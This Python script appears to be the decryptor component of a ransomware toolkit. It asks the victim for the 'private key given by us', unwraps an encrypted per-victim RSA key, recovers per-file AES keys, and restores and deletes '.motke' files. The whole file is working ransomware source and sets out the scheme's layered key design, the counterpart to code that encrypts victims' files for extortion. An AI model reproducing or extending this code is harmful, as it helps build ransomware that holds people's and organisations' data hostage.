from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import os


def read_enc_mal_private():
    with open('encrypted_private_rsa.motke', 'rb') as file:
        enc_mal_private = file.read()
    return enc_mal_private


def load_server_private(file_name):
    with open(file_name, "rb") as key_file:
        server_private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )

    return server_private_key


def decrypt_mal_priv(enc_mal_priv, server_priv):
    dec_data = b''
    for chunk in range(0, len(enc_mal_priv), 256):
        og_data = server_priv.decrypt(
            enc_mal_priv[chunk: chunk + 256],
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        dec_data += og_data

    private_key = serialization.load_pem_private_key(
        dec_data,
        password=None,
        backend=default_backend()
    )
    return private_key


def read_enc_file(file_path):
    with open(file_path, 'rb') as file:
        enc_aes_key = file.read()[:256]
    return enc_aes_key


def decrypt_aes_key(mal_priv, encrypted_aes_key):
    aes_key = mal_priv.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return aes_key


def decrypt_file(file_path, aes_key, new_name):
    chunk_size = 12000100
    path, file_name = os.path.split(file_path)
    f = Fernet(aes_key)
    with open(file_path, 'rb') as file:
        enc_data = file.read()
        if path == '':
            with open(new_name, 'wb') as file:
                for chunk in range(256, len(enc_data), chunk_size):
                    file.write(decrypt_data_aes(enc_data[chunk: chunk+chunk_size], f))
        else:
            with open(os.path.join(path, new_name), 'wb') as file:
                for chunk in range(256, len(enc_data), 12000100):
                    file.write(decrypt_data_aes(enc_data[chunk: chunk+chunk_size], f))

    os.remove(file_path)


def decrypt_data_aes(data, key):
    output = key.decrypt(data)
    return output


def scan_files_in_folder(path):
    all_files = os.listdir(path)
    ext_to_decrypt = ['motke']
    files_to_encrypt = []
    for file in all_files:
        file_ext = file.split('.')[-1]
        file_name = file.split('.')[:-1]
        if (file_ext in ext_to_decrypt) and (file_name[0] != 'encrypted_private_rsa'):
            files_to_encrypt.append(file)

    return files_to_encrypt


def select_folder():
    while True:
        folder_path = input('Enter full folder path to decrypt:\n')
        if os.path.isdir(folder_path):
            return folder_path
        else:
            print('Folder does not exist or path passed is invalid.')


def main():
    enc_mal_key = read_enc_mal_private()
    while True:
        server_priv_name = input('Enter private key given by us:\n')
        if not os.path.isfile(server_priv_name):
            print('Key is not found.')
        else:
            break
    server_private_key = load_server_private(server_priv_name)
    mal_priv = decrypt_mal_priv(enc_mal_key, server_private_key)
    folder_path = select_folder()
    files = scan_files_in_folder(folder_path)
    for file in files:
        file = os.path.join(folder_path, file)
        enc_aes_key = read_enc_file(file)
        aes_key = decrypt_aes_key(mal_priv, enc_aes_key)
        new_file_name = file.replace('.motke', '')
        decrypt_file(file, aes_key, new_file_name)

main()